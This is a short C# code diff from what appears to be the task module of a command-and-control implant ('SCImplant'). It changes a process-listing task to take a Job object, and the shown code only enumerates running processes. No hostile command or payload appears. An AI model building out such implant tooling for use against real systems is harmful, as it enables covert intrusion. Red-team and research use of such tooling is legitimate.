@@ -4,13 +4,15 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
+using SaltedCaramel.Jobs;
 
 namespace SaltedCaramel.Tasks
 {
     public class ProcessList
     {
-        public static void Execute(SCTask task, SCImplant agent)
+        public static void Execute(Job job, SCImplant agent)
         {
+            SCTask task = job.Task;
             List<Dictionary<string, string>> procList = new List<Dictionary<string, string>>();
             foreach (Process proc in Process.GetProcesses())
             {
